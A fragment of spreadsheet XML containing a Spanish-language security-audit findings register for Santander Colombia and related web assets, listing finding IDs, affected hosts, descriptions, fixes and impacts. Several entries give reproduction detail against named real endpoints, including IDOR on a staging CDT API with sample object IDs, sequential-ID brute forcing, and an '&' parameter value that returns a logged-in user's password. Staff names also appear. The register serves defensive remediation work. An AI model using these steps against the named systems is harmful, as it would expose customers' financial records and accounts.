nginx.conf, .htpasswd, key.pem, certificado.pem, httpd.conf, despliegue.yaml, servicio.yaml, my.cnf, mysql.ini, postgresql.conf, mongod.conf, squid.conf, squidGuard.conf, squidGuard.conf.template, haproxy.cfg, iptables.rules, claves_autorizadas
https://assets.cdt.santander.com.co/squidGuard.conf
Lógica de detección de QID:
este QID envía una solicitud GET al servidor de destino para recuperar el contenido del archivo.</t>
  </si>
  <si>
    <t>Verifique que se permita el acceso a este archivo. Si es necesario, elimínelo o aplique controles de acceso al archivo.</t>
  </si>
  <si>
    <t>El contenido de este archivo puede revelar información confidencial que podría brindarle a un atacante una ventaja técnica para obtener más información sobre su objetivo.</t>
  </si>
  <si>
    <t>Escalada: 30/04/2024</t>
  </si>
  <si>
    <t>Olga Maria Camargo Orjuela</t>
  </si>
  <si>
    <t>MAN-665045f6c382686af2c7f53a</t>
  </si>
  <si>
    <t>CO-24-CNMPO-006-AP-001</t>
  </si>
  <si>
    <t>Referencias Inseguras a Objetos de manera Directa (IDOR)</t>
  </si>
  <si>
    <t>api.stg.mb.cdt.santander.com.co</t>
  </si>
  <si>
    <t>El aplicativo no realiza una correcta comprobación del acceso a los recursos del usuario en el Backend, pudiendo acceder un usuario de manera directa a información no legítima modificando el identificador que referencia al objeto que muestra la información accesible.
En este caso particular, un usuario puede acceder de manera directa a los detalles de contratación del CDT a través de la URL https://api.stg.mb.cdt.santander.com.co/mb-apiprocess/v1/deposit/processes/4919/details modificando el identificador.
Modificando el id que aparece en el GET es posible obtener los detalles de otros usuarios
El ID parece secuencial, por lo que se realizó un ataque
de fuerza bruta sobre el mismo, obteniendo un listado bastante amplio de IDs válidos</t>
  </si>
  <si>
    <t>Se recomienda introducir mecanismos de validación basado en accesos por usuario o roles, para
acceder a la información identificada y comprobar en el lado del servidor que el usuario tiene
privilegios de acceso a la información consultada.</t>
  </si>
  <si>
    <t xml:space="preserve">Un atacante puede evadir el sistema de autorización y acceder a los recursos del aplicativo
directamente modificando el valor de un parámetro utilizado para apuntar directamente a un objeto.
Dichos recursos pueden ser registros, entradas de bases de datos que pertenecen a otros usuarios,
archivos en el sistema o cualquier tipo de información a la que no debería tener acceso de manera
previa. </t>
  </si>
  <si>
    <t>MAN-6641f46adafe1d62bb498323</t>
  </si>
  <si>
    <t>CO-24-CNMPO-002-AP-001</t>
  </si>
  <si>
    <t>Filtración de contraseña de usuario logado por fallo en BBDD</t>
  </si>
  <si>
    <t>Se ha detectado un fallo de acceso por la aplicación a los valores del mantenimiento de la sesión,
que conllevan el uso de las preguntas de seguridad, y de la contraseña del usuario.
Concretamente, esta vulnerabilidad se ha descubierto en el siguiente formulario:
• Funcionalidad: Confirming-&gt;Security Actions-&gt;Administrar Cuestionario de Seguridad-
&gt;seguridad.respuestas.preguntas.cuestionario.respuesta
• Parámetro: formularioRespPreg%3AtempRespuestaPreg1%3ArespuestaPreg1
• Payload: &amp;
el valor original de la primera respuesta es “AAAAA”
Se modifica el valor, se pulsa sobre el botón de guardado, y se intercepta la petición gracias a un proxy intermedio, pudiendo ver perfectamente los valores que se envían al servidor
Gracias al proxy, se puede paralizar y modificar la petición antes de ser enviada. En este caso, se modifica el valor “AAAAAb” por “&amp;”, obteniendo una respuesta correcta por parte del servidor
Internamente, esta acción genera algún error de asignación y de toma de valores de la BBDD que no se ha podido determinar, pero que concluye trayendo al campo modificado la contraseña actual del usuario logado
Se muestra un error con texto “value is required”, lo que muestra que hay un error entre el servidor y el FrontEnd, ya que aunque el campo esté relleno se requiere
que no se deje vacío.
Al no estar sanitizada la entrada de este formulario por el Backend, muy probablemente el servidor esté interpretando que el payload introducido en esta clave-valor es otro separador adicional, conllevando a un comportamiento inesperado.
Se ha detectado un fallo de lógica de negocio, ya que a la hora de modificar una contraseña en una cuenta logueada, ésta aparece “oculta” pero dentro del formulario, cuando debería ser solicitada para así confirmar que el usuario que está intentando modificar la cuenta no es un usuario malintencionado
Si bien aparece oculta, a la hora de ingresar cualquier otra nueva contraseña, se envía en texto plano contra el servidor.
Gracias a un proxy, podría paralizarse la petición, obtener la contraseña, y desechar la petición.
Debe tenerse en cuenta que un usuario malintencionado, al tener acceso a una cuenta logueada, podría modificar sin problema la contraseña del usuario impersonado.
Si bien se ha considerado que esta vulnerabilidad tiene un riesgo medio, deberá tenerse en cuenta que obtener la contraseña de un usuario logueado podría conllevar a vulnerabilidades de mayor riesgo.</t>
  </si>
  <si>
    <t>Se deberá analizar en profundidad el uso que hace la aplicación de los valores de la Base de Datos, sanitizando cada input de la aplicación y verificando que no se puedan acceder a datos de otros campos mediante referencias a los mismos.
A la hora de modificar la contraseña de un usuario logueado, se deberá solicitar el campo de “Contraseña actual”, y no ser cargado directamente</t>
  </si>
  <si>
    <t>La obtención de la contraseña de un usuario logado en la aplicación gracias a la acción de un usuario
malintencionado ante un ataque físico contra el dispositivo que esté haciendo uso de la aplicación o
que consiga que la víctima caiga en un ataque por el que se retorne una sesión logueada, conlleva a
la falta total de confidencialidad, afectando también a la disponibilidad e integridad de la cuenta.
Una mala implementación de la funcionalidad de cambio de contraseña permite recuperar la misma
dentro de una sesión de un usuario logado</t>
  </si>
  <si>
    <t>1° Fecha: 17/10/2024</t>
  </si>
  <si>
    <t>MAN-6650597dc382686af2c81198</t>
  </si>
  <si>
    <t>CO-24-CNMPO-006-AP-003</t>
  </si>
  <si>
    <t>Acceso no autorizado</t>
  </si>
  <si>
    <t>Se ha detectado una URL de la API, (https://api.stg.mb.cdt.santander.com.co/mb-api-pse/v1/cdt/informationpaymentCdt?id-reference=(NºREF)), a través de la cual se puede consultar el estado del CDT del usuario logado en la sesión. Por ejemplo: https://api.stg.mb.cdt.santander.com.co/mb-api-pse/v1/cdt/informationpaymentCdt?id-reference=00650100000040683671
Se ha podido comprobar, que, desde cualquier usuario, se podría tener acceso al estado de los CDT de otros usuarios, simplemente utilizando la URL indicada y un token de sesión en uso.
Se puede observar, que el usuario de la sesión actual tiene un CDT: 00650100000040683710
Utilizando el token de sesión actual y la URL vulnerable, el usuario podría acceder a información de los CDT de otros usuarios
Una vez hecha la comprobación del usuario a los datos de su CDT, utilizando la misma petición y realizando la consulta sobre los números de CDT de terceros, se podría tener acceso a esta información restringida sin problemas. De modo que se tendría acceso a información confidencial, se podrían enumerar CDT y tener acceso al estado de los mismos.</t>
  </si>
  <si>
    <t>Se recomienda introducir mecanismos de validación mediante token de inicio de sesión únicos, así como validación de acceso basado en usuarios y roles, para acceder a la información autorizada.</t>
  </si>
  <si>
    <t>Un usuario malintencionado puede acceder a información no autorizada para el nivel de acceso que dispone, o incluso acceder a información restringida perteneciente a otros usuarios de la aplicación.</t>
  </si>
  <si>
    <t>MAN-665715e33d46490637cd2103</t>
  </si>
  <si>
    <t>CO-24-CNMPO-007-AP-001</t>
  </si>
  <si>
    <t>Interacción con servicios externos (DNS)</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas se ha comprobado que el servidor realiza una consulta DNS cuando se envían ciertas peticiones HTTP sobre el aplicativo. A continuación, se muestra la petición HTTP que genera esta iteración con ciertos servidores DNS externos
Por otro lado,  se identifica la información recogida por el DNS cuando el servidor HTTP realiza la consulta.</t>
  </si>
  <si>
    <t>Se recomienda, en caso de no ser necesario, deshabilitar la configuración del servidor para que no se le permita realizar consultas DNS a un servidor externo. En su lugar configurar el servidor afectado para que utilice un servidor DNS interno o de la DMZ.</t>
  </si>
  <si>
    <t>Dado que el servidor remoto realiza una consulta DNS existen ciertos datos del sistema que inició la consulta que quedarían expuestos en el servidor DNS controlado por un atacante. De esta manera, un atacante podría obtener más información sobre el equipo remoto, por ejemplo la dirección IP del mismo. Otro riesgo asociado a este tipo de vulnerabilidad es que se puede utilizar el sistema afectado como proxy para el envío de payloads tipo DNS o incluso como proxy en técnicas de exfiltración de datos vía DNS. En ambos casos la dirección del Servidor DNS del atacante permanece oculta y se mostraría la dirección IP del servidor afectado como originaria del ataque.</t>
  </si>
  <si>
    <t>MAN-665049dbc382686af2c7f540</t>
  </si>
  <si>
    <t>CO-24-CNMPO-006-AP-002</t>
  </si>
  <si>
    <t>Test Eicar de subida de ficheros fallido</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas, se ha podido comprobar que la aplicación no restringe la subida a ficheros infectados con malware.
Se han encontrado diferentes puntos de subida de documentos, donde el archivo subido no se comprueba y por tanto podrían suponer un vector idóneo para la subida y dispersión de malware. Pasan a enumerarse
https://api.stg.mb.cdt.santander.com.co/mb-api-doc-manager/v4/documents
Vector 2:
Durante el proceso de registro a través de: https://www.stg.mb.cdt.santander.com.co/stc/onboarding/registration/personal-data, en los últimos pasos de contratación del CDT, al igual que en el vector anterior, en algunas ocasiones concretas (dependerá de algunas características, como tipo de riesgo, etc.), la aplicación puede solicitar la subida de documentos en PDF.
A través de esta subida, se consiguió subir ficheros Eicar. Como puede comprobarse, aunque el vector de inicio es diferente, la URL final de subida de documentos es la misma que en el ejemplo anterior: https://api.stg.mb.cdt.santander.com.co/mb-api-doc-manager/v4/documents.
Estos ficheros, sirven de apoyo a los gestores a la hora del estudio de la petición de creación de un CDT, por parte de los usuarios.
Como puede comprobarse en la siguiente imagen, un gestor puede acceder al documento y abrirlo sin problema con el considerable riesgo que supondría de tratarse de un fichero con malware real</t>
  </si>
  <si>
    <t>Se recomienda establecer un paso intermedio en el proceso de la subida de ficheros, por ejemplo, implementar un sistema de tipo "sandbox" donde se analice el archivo subido en busca de malware. Establecer una función de comprobación y validación de los ficheros que los usuarios suben a la aplicación.</t>
  </si>
  <si>
    <t>Podría llegar a ejecutarse código en el lado servidor de la aplicación. Además de convertir el sitio web en un punto de dispersión de malware.</t>
  </si>
  <si>
    <t>MAN-66505afdc382686af2c81199</t>
  </si>
  <si>
    <t>CO-24-CNMPO-006-CO-004</t>
  </si>
  <si>
    <t>stg.mb.cdt.santander.com.co</t>
  </si>
  <si>
    <t xml:space="preserve">Durante la auditoría, se han encontrado documentos descargables dentro de la aplicación, que contienen metadatos con información, como software, usuarios, etc.
Se recomienda una revisión de los mismos, para la eliminación de estos metadatos.
Evidencias:
Durante el proceso de apertura de un CDT, nos encontramos con el requisito de aceptación de “Reglamento del producto CDT”.
Este documento que debe de ser aceptado, debe de ser descargado y leido por el usuario que esta realizando la apertura del CDT.
Después de descargar el documento y analizarlo, se observa que contiene metadatos, con el nombre del creador de dicho documento.
https://www.stg.mb.cdt.santander.com.co/assets/SB_CO/es-CO/documents/v1/CO.SAN.TRADICIONAL.CDT.REGULATION.pdf
</t>
  </si>
  <si>
    <t>La información contenida en los metadatos de los archivos identificados podría ser utilizada por un atacante para obtener un mayor entendimiento de la organización, y así planificar ataques de ingeniería social o phishing dirigidos a determinados usuarios.</t>
  </si>
  <si>
    <t>MAN-66505debc382686af2c8119c</t>
  </si>
  <si>
    <t>CO-24-CNMPO-006-CO-005</t>
  </si>
  <si>
    <t>Activo vulnerable a Lucky13</t>
  </si>
  <si>
    <t xml:space="preserve">A continuación, se puede ver que el servidor esta potencialmente afectado por la vulnerabilidad Lucky13 en los siguientes dominios:
Si el servidor admite cifrados CBC, es potencialmente vulnerable.
https://www.stg.mb.cdt.santander.com.co/
</t>
  </si>
  <si>
    <t xml:space="preserve">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 https://www.openssl.org/source/
</t>
  </si>
  <si>
    <t>MAN-66506025c382686af2c8119e</t>
  </si>
  <si>
    <t>CO-24-CNMPO-006-CO-006</t>
  </si>
  <si>
    <t>Fuga de información en cabeceras</t>
  </si>
  <si>
    <t>desarrollo.pse.com.co</t>
  </si>
  <si>
    <t xml:space="preserve">Durante las pruebas realizadas se ha comprobado que las cabeceras de respuesta del servidor que sustenta la aplicación revelan información interna acerca de la tecnología utilizada por el servidor.
https://desarrollo.pse.com.co/SampleFE/TransactionPage.aspx?transactionid=4125452
</t>
  </si>
  <si>
    <t>Se recomienda evitar que la aplicación devuelva al usuario información relativa a la naturaleza y versión de la misma. Este tipo de información puede ser accesible a través de los identificadores de sesión utilizados, mensajes de error y/o páginas por defecto. En este caso concreto, se recomienda eliminar las cabeceras con información, de las respuestas del servidor.</t>
  </si>
  <si>
    <t>Conocer la versión y tipo del software que se está ejecutando en el activo analizado permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas. De esta manera, el atacante podría hacerse con el control del activo analizado de ser éste vulnerable.</t>
  </si>
  <si>
    <t>MAN-66506103c382686af2c811a0</t>
  </si>
  <si>
    <t>CO-24-CNMPO-006-AP-007</t>
  </si>
  <si>
    <t>Autocompletado en formularios</t>
  </si>
  <si>
    <t>Se detecta la función “Autocompletar” activa:
https://www.stg.mb.cdt.santander.com.co/stc/onboarding/registration/personal-data</t>
  </si>
  <si>
    <t>Se recomienda añadir la directiva "autocomplete=off" en todos los campos que contengan información sensible que vaya a ser enviada a la aplicación para evitar que esta información sea cacheada y posteriormente recuperada por un tercero con acceso al navegador del usuario.</t>
  </si>
  <si>
    <t>Un usuario que haga uso de esta funcionalidad en un ordenador público, o que sea utilizado por terceros, permitiría al siguiente usuario del puesto ver los datos introducidos para acceder a la aplicación.</t>
  </si>
  <si>
    <t>MAN-66699603bb0dea0e40ef2e33</t>
  </si>
  <si>
    <t>La vulnerabilidad Browser Exploit Against SSL/TLS o BEAST se produce mediante el cifrado de datos
en modo CBC con vectores de inicialización encadenados, lo que permite a los atacantes
intermedios obtener encabezados HTTP de texto sin formato.
A modo de evidencia, se muestra el resultado de la herramienta "testssl” sobre el servidor afectado
prospera.santanderconsumer.co que muestra que el activo es vulnerable a BEAST</t>
  </si>
  <si>
    <t>Configurar los servidores SSL/TLS para soportar únicamente TLS 1.3 o TLS 1.2 si es compatible.
Además, configure los servidores SSL/TLS para que solo sean compatibles con los conjuntos de
cifrado que no usan algoritmos de cifrado por bloque (CBC).</t>
  </si>
  <si>
    <t>La vulnerabilidad CBC puede permitir ataques contra SSL para descifrar y obtener información
sensible transmitida entre el navegador del usuario y el servidor de la aplicación tales como
identificadores de sesión del usuario, credenciales, etc.</t>
  </si>
  <si>
    <t>MAN-666994c9bb0dea0e40ef2d8d</t>
  </si>
  <si>
    <t>La vulnerabilidad Browser Exploit Against SSL/TLS o BEAST se produce mediante el cifrado de datos
en modo CBC con vectores de inicialización encadenados, lo que permite a los atacantes
intermedios obtener encabezados HTTP de texto sin formato.
A modo de evidencia, se muestra el resultado de la herramienta "testssl” sobre el servidor afectado
sso-management.servicios.santanderconsumer.co que muestra que el activo es vulnerable a
BEAST</t>
  </si>
  <si>
    <t>MAN-66699564bb0dea0e40ef2dcb</t>
  </si>
  <si>
    <t>Renegociación insegura del handshake en SSL/TLS iniciada por el cliente</t>
  </si>
  <si>
    <t>A continuación se muestra la evidencia de la herramienta "testssl" que demuestra que la renegociación insegura se encuentra habilitada en el sistema remoto</t>
  </si>
  <si>
    <t>Se recomienda deshabilitar la opción de "Renegociación insegura iniciada por el cliente" en el
fichero de configuración del servidor. De manera alternativa se recomienda mantener las librerías
TLS/SSL actualizadas a la última versión disponible.</t>
  </si>
  <si>
    <t>Un atacante remoto no autenticado puede aprovechar la vulnerabilidad de "Renegociación insegura
SSL iniciada por el cliente" para inyectar una cantidad arbitraria de texto sin formato en el principio
de la secuencia de protocolo de aplicación, que podría facilitar los ataques man-in-the-middle. De
esta manera, el atacante tendría acceso a la información transmitida e, incluso, podría llegar a
modificarla.</t>
  </si>
  <si>
    <t>MAN-666995c5bb0dea0e40ef2e11</t>
  </si>
  <si>
    <t>QA-WAS-a02e993a-2331-4215-9ac6-735ce85f8354</t>
  </si>
  <si>
    <t>https://api.santander.com.co/</t>
  </si>
  <si>
    <t>La página web puede estar enmarcada, lo que significa que es posible que se produzcan ataques de clickjacking contra los usuarios.</t>
  </si>
  <si>
    <t>Los mecanismos de prevención de clickjacking incluyen:
- X-Frame-Options: este encabezado de respuesta HTTP se puede utilizar para evitar el enmarcado de páginas web.
- Content-Security-Policy: la directiva 'frame-ancestors' se puede utilizar para evitar el enmarcado de páginas web.
- Código JavaScript Framekiller diseñado para evitar que un usuario malintencionado enmarque la página. Este método no se recomienda debido a su poca fiabilidad.
Consulte la hoja de trucos de defensa contra el secuestro de clics de OWASP para obtener más información.
Para evitar un error común de implementación de X-Frame-Options, consulte https://blog.qualys.com/securitylabs/2015/10/20/clickjacking-a-common-implementation-mistake-that-can-put-your-websites-in-danger</t>
  </si>
  <si>
    <t>Con el clickjacking, un atacante puede engañar a un usuario víctima para que haga clic en un marco invisible en la página web, provocando así que la víctima realice una acción que no tenía intención de realizar.</t>
  </si>
  <si>
    <t xml:space="preserve">Go Any Where </t>
  </si>
  <si>
    <t>MAN-66e8470b845f3141b2eafcd9</t>
  </si>
  <si>
    <t>CO-24-CNMPA-010-CO-001</t>
  </si>
  <si>
    <t>https://servicios.santander.com.co/webclient/Login.xhtml</t>
  </si>
  <si>
    <t>se ha observado que la cookie asociada a la gestión de la sesión, “incap_ses_XXXX_YYYYYYY” del usuario no tienen aplicado el atributo de seguridad "HttpOnly". Este atributo impide el robo del identificador de sesión del usuario almacenado en la cookie mediante ataques de Cross Site Scripting, ya que no permite el acceso a la misma mediante scripts del lado del cliente.</t>
  </si>
  <si>
    <t>Se recomienda proteger los identificadores de sesión, almacenados a través de las cookies, mediante el atributo de seguridad "HttpOnly". De esta manera se evita que se pueda acceder al identificador de sesión desde secuencias de comandos (JavaScript, ActiveX).</t>
  </si>
  <si>
    <t>El robo de identificadores de la sesión de un usuario a través de las cookies podría permitir a un atacante acceder a las sesiones privadas de otros usuarios, suplantando la identidad de estos dentro de la aplicación.</t>
  </si>
  <si>
    <t>Cesar Augusto Garzón Puentes</t>
  </si>
  <si>
    <t>MAN-66e8484c845f3141b2eafcda</t>
  </si>
  <si>
    <t>CO-24-CNMPA-010-CO-002</t>
  </si>
  <si>
    <t>Configuración incorrecta de cabecera Content-Security-Policy</t>
  </si>
  <si>
    <t xml:space="preserve">Se ha detectado que el servidor web incluye en la cabecera "Content Security Policy" en las respuestas HTTP del servidor el parámetro 'unsafe-inline'.
</t>
  </si>
  <si>
    <t>Para implementar correctamente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"Content-Security-Policy" (en ocasiones se observarán menciones de la cabecera X-Content-Security-Policy, pero se trata de una versión antigua y no es necesario configurarla). Un ejemplo de configuración de cabecera es el siguiente: • Content-Security-Policy: default-src 'self' *.trusted.com Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una políticapor ejemplo:
&lt;meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';"&gt; Para obtener una referencia completa acerca de todas las directivas "Content Security Policy" se recomienda visitar los siguientes enlaces: • https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP • https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html</t>
  </si>
  <si>
    <t>La incorrecta configuración de la cabecera "Content Security Policy" puede permitir a un atacante que localice una vulnerabilidad de tipo "Cross Site Scripting"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t>
  </si>
  <si>
    <t>Jorge Guzman</t>
  </si>
  <si>
    <t>MAN-66e8492f845f3141b2eafcdb</t>
  </si>
  <si>
    <t>CO-24-CNMPA-010-CO-003</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas se ha observado que las cookies asociadas a la gestión de la sesión no tienen aplicado el atributo de seguridad "secure". Este atributo indica al navegador que sólo incluya la cookie si se envía a través de un canal cifrado como es el caso del protocolo HTTPS.</t>
  </si>
  <si>
    <t>Se recomienda proteger los identificadores de sesión, almacenados a través de las cookies, mediante el atributo de seguridad "secure". De esta manera se evitando que el identificador de sesión pueda ser transmitido por canales no cifrados.</t>
  </si>
  <si>
    <t>MAN-66e84a96845f3141b2eafcdc</t>
  </si>
  <si>
    <t>CO-24-CNMPA-010-CO-004</t>
  </si>
  <si>
    <t>Revelación de información a través de SSL/TLS (BREACH)</t>
  </si>
  <si>
    <t>Durante el análisis de las conexiones cifradas se ha podido comprobar que el servidor web ofrece compresión Gzip en sus conexiones, el cual es vulnerable a Breach</t>
  </si>
  <si>
    <t>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como se deshabilita la compresión HTTP para Apache y NGINX:
 • Deshabilitar compresión en Apache: 
o Deshabilite el módulo mod_deflate utilizando el siguiente comando: 
$ sudo a2dismod deflate 
o Reinicie el servidor: 
$ sudo /etc/init.d/apache2 restart 
• Deshabilitar compresión en NGINX: o Establezca la configuración del host con la opción gzip en off:
server { server_name www.example.com; listen 443 ssl http2; gzip off; }</t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>MAN-66e84b88845f3141b2eafcdd</t>
  </si>
  <si>
    <t>CO-24-CNMPA-010-CO-005</t>
  </si>
  <si>
    <t>Revelación de información a través de SSL/TLS (LUCKY13 CVE-2013-0169)</t>
  </si>
  <si>
    <t>Se ha podido comprobar que el servidor que sustenta la aplicación es vulnerable a Lucky13</t>
  </si>
  <si>
    <t>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 https:/www.openssl.org/source/</t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>MAN-66e84e9b845f3141b2eafcde</t>
  </si>
  <si>
    <t>CO-24-CNMPO-011-AP-001</t>
  </si>
  <si>
    <t>Fuga de información de direcciones IP internas</t>
  </si>
  <si>
    <t>https://servicios.santander.com.co/webclient/ActivityReport.xhtml</t>
  </si>
  <si>
    <t>La aplicación auditada divulga información acerca de direcciones IP utilizadas por el portal web en la dirección URL https://servicios.santander.com.co/webclient/ActivityReport.xhtml</t>
  </si>
  <si>
    <t>Se recomienda evitar que la aplicación devuelva al usuario información relativa al funcionamiento interno del servidor, como puede ser direccionamiento IP de la red interna en la que está ubicado el mismo.</t>
  </si>
  <si>
    <t>Un atacante podría utilizar esta vulnerabilidad para obtener información del direccionamiento IP del sistema, pudiendo llegar a localizar otros activos vulnerables en la red o mapear la red interna.</t>
  </si>
  <si>
    <t>Olimpia</t>
  </si>
  <si>
    <t>MAN-66e2e9c0845f3141b2ea2927</t>
  </si>
  <si>
    <t>CO-24-CNMPA-009-CO-001</t>
  </si>
  <si>
    <t>https://recidam.olimpiait.com</t>
  </si>
  <si>
    <t>La aplicación afectada no realiza una gestión adecuada de los mensajes de error producidos en el aplicativo. Se evidencia un error de tipo NullReferenceException que revela información acerca de la Liberia utilizada para deserializar los parametros</t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>MAN-66e2e9c0845f3141b2ea2928</t>
  </si>
  <si>
    <t>CO-24-CNMPA-009-CO-002</t>
  </si>
  <si>
    <t>https://recidaw.olimpiait.com</t>
  </si>
  <si>
    <t>MAN-66e2ea34845f3141b2ea2931</t>
  </si>
  <si>
    <t>CO-24-CNMPA-009-CO-003</t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>El robo de identificadores de la sesión de un usuario a través de las cookies podría permitir a un atacante acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos dentro de la aplicación.</t>
  </si>
  <si>
    <t>MAN-66e2ea34845f3141b2ea2932</t>
  </si>
  <si>
    <t>CO-24-CNMPA-009-CO-004</t>
  </si>
  <si>
    <t>MAN-66e2ea7d845f3141b2ea2944</t>
  </si>
  <si>
    <t>CO-24-CNMPA-009-CO-005</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas se ha observado que las cookies asociadas a la gestión de la sesión no tiene aplicado el atributo de seguridad "secure". Este atributo indica al navegador que sólo incluya la cookie si se envía a través de un canal cifrado como es el caso del protocolo HTTPS.</t>
  </si>
  <si>
    <t>MAN-66e2ea7d845f3141b2ea2945</t>
  </si>
  <si>
    <t>CO-24-CNMPA-009-CO-006</t>
  </si>
  <si>
    <t>MAN-66e301af845f3141b2ea2a05</t>
  </si>
  <si>
    <t>CO-24-CNMPA-009-CO-007</t>
  </si>
  <si>
    <t>Se ha podido comprobar que el servidor que sustenta la aplicación es vulnerable a Lucky13.</t>
  </si>
  <si>
    <t>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</si>
  <si>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t>
  </si>
  <si>
    <t>MAN-66e301af845f3141b2ea2a06</t>
  </si>
  <si>
    <t>CO-24-CNMPA-009-CO-008</t>
  </si>
  <si>
    <t>MAN-66e30220845f3141b2ea2a07</t>
  </si>
  <si>
    <t>CO-24-CNMPA-009-CO-009</t>
  </si>
  <si>
    <t>Cabeceras Pragma HTTP y Cache-control incompletas o no habilitadas</t>
  </si>
  <si>
    <t>Durante la realización de las pruebas se ha podido comprobar el servidor no implementa de manera correcta las cabeceras "Cache-Control" ni la cabecera "Pragma", ambas indicadas para controlar la información guardada en caché por el navegador.
las cabeceras de respuesta del servidor en la que se puede observar que no se genera con los atributos de seguridad “Cache-control” y/o “Pragma.</t>
  </si>
  <si>
    <t>Las aplicaciones deben devolver las directivas de almacenamiento en caché indicando a los navegadores que no almacenen copias locales de ningún dato sensible. 
A menudo, esto se puede lograr mediante la configuración del servidor web para evitar el almacenamiento en caché de rutas relevantes o cualquier otra información sensible. 
Alternativamente, la mayoría de las plataformas de desarrollo web, permiten controlar las directivas de almacenamiento en caché del servidor desde scripts individuales. 
Se recomienda que el servidor web devuelva las siguientes cabeceras HTTP en todas las respuestas que contengan contenido sensible: 
•Cache-control: no-store 
•Pragma: no-cache</t>
  </si>
  <si>
    <t>A menos que se indique lo contrario, los navegadores pueden almacenar una copia en caché local del contenido recibido de los servidores web. Algunos navegadores, guardan en caché el contenido obtenido a través de HTTPS. Si la información sensible en las respuestas de la aplicación se almacena en caché local, puede ser recuperada por otros usuarios que tienen acceso a la misma computadora en un momento futuro además de ser susceptible a ataques de tipo Caché Poisoning.</t>
  </si>
  <si>
    <t>MAN-66e3028b845f3141b2ea2a08</t>
  </si>
  <si>
    <t>CO-24-CNMPA-009-CO-010</t>
  </si>
  <si>
    <t>La vulnerabilidad Browser Exploit Against SSL/TLS o BEAST se produce mediante el cifrado de datos en modo CBC con vectores de inicialización encadenados, lo que permite a los atacantes intermedios obtener encabezados HTTP de texto sin formato.
e muestra el resultado de la herramienta "testssl” sobre el servidor afectado recidaw y recidvw que muestra que el activo es vulnerable a BEAST</t>
  </si>
  <si>
    <t>Configurar los servidores SSL/TLS para soportar únicamente TLS 1.3 o TLS 1.2 si es compatible. Además, configure los servidores SSL/TLS para que solo sean compatibles con los conjuntos de cifrado que no usan algoritmos de cifrado por bloque (CBC).</t>
  </si>
  <si>
    <t>La vulnerabilidad CBC puede permitir ataques contra SSL para descifrar y obtener información sensible transmitida entre el navegador del usuario y el servidor de la aplicación tales como identificadores de sesión del usuario, credenciales, etc.</t>
  </si>
  <si>
    <t>MAN-66e3028b845f3141b2ea2a09</t>
  </si>
  <si>
    <t>CO-24-CNMPA-009-CO-011</t>
  </si>
  <si>
    <t>MAN-66e302d3845f3141b2ea2a0d</t>
  </si>
  <si>
    <t>CO-24-CNMPA-009-CO-012</t>
  </si>
  <si>
    <t>La herramienta "testssl" que demuestra que la renegociación insegura se encuentra habilitada en el sistema remoto</t>
  </si>
  <si>
    <t>Se recomienda deshabilitar la opción de "Renegociación insegura iniciada por el cliente" en el fichero de configuración del servidor. De manera alternativa se recomienda mantener las librerías TLS/SSL actualizadas a la última versión disponible.</t>
  </si>
  <si>
    <t>Un atacante remoto no autenticado puede aprovechar la vulnerabilidad de "Renegociación insegura SSL iniciada por el cliente" para inyectar una cantidad arbitraria de texto sin formato en el principio de la secuencia de protocolo de aplicación, que podría facilitar los ataques man-in-the-middle. De esta manera, el atacante tendría acceso a la información transmitida e, incluso, podría llegar a modificarla.</t>
  </si>
  <si>
    <t>MAN-66e302d3845f3141b2ea2a0e</t>
  </si>
  <si>
    <t>CO-24-CNMPA-009-CO-013</t>
  </si>
  <si>
    <t>MAN-33d542f7</t>
  </si>
  <si>
    <t>SC-22-CNMPO-008-CO-007</t>
  </si>
  <si>
    <t>Se ha observado que el recurso afectado posiblemente no implementa un Rate Limiter (limitador de velocidad), lo que permite a los usuarios realizar varias solicitudes por segundo, en nuestro caso fuimos capaces de realizar 80 peticiones en un segundo.</t>
  </si>
  <si>
    <t>MAN-33d542f5</t>
  </si>
  <si>
    <t>SC-22-CNMPO-008-CO-005</t>
  </si>
  <si>
    <t>Este ataque consiste en detectar pequeñas diferencias de tiempo cuando se producen errores TLS generados a base de mandar peticiones maliciosas al servidor. Con estos ataques es posible descifrar bloques TLS, aunque la cantidad de peticiones depende del tipo de conexión, el ruido y el algoritmo de MAC utilizado.</t>
  </si>
  <si>
    <t>Site emits visible browser logs</t>
  </si>
  <si>
    <t>Los registros del navegador hacen referencia a mensajes o información generados por los scripts o procesos de back-end de un sitio web que se envían directamente a la consola del navegador. Estos registros suelen incluir información de depuración, mensajes de error, advertencias u otros resultados de diagnóstico que los desarrolladores y los usuarios utilizan para solucionar problemas.</t>
  </si>
  <si>
    <t>- Limite los registros del navegador a la información de diagnóstico esencial.
- Evite registrar datos confidenciales como credenciales de usuario o información de identificación personal.
- Implementar controles para restringir el acceso a los registros del navegador únicamente al personal autorizado.
- Utilice técnicas de cifrado u ofuscación para proteger la información confidencial dentro de los registros.
- Revise y monitoree periódicamente los registros del navegador para detectar cualquier actividad inusual o sospechosa.</t>
  </si>
  <si>
    <t>El riesgo de emitir registros del navegador radica en la posible exposición de información confidencial a terceros no autorizados. Estos registros pueden revelar inadvertidamente credenciales de usuario, información de identificación personal u otros datos confidenciales, que pueden ser explotados por actores maliciosos para el robo de identidad, fraude u otros fines nefastos. Además, la exposición de detalles internos del sistema o mensajes de error puede proporcionar a los atacantes información sobre posibles vulnerabilidades o debilidades dentro de la infraestructura del sitio web.</t>
  </si>
  <si>
    <t>Site fails to load page components</t>
  </si>
  <si>
